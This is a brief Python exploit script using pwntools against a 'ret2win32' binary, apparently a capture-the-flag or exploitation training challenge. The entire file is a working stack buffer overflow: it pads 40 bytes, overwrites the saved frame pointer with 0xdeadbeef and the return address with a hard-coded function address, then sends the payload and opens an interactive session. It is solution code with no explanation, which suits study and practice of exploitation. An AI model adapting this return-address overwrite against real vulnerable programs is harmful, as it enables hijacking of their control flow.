from pwn import *

sh = process('./ret2win32')
# address
ret_addr = p32(0x0804862c) # ret2win
deadbeef = p32(0xdeadbeef)

# payload 
payload  = b'a'*40 + deadbeef + ret_addr


sh.sendline(payload)
sh.interactive()
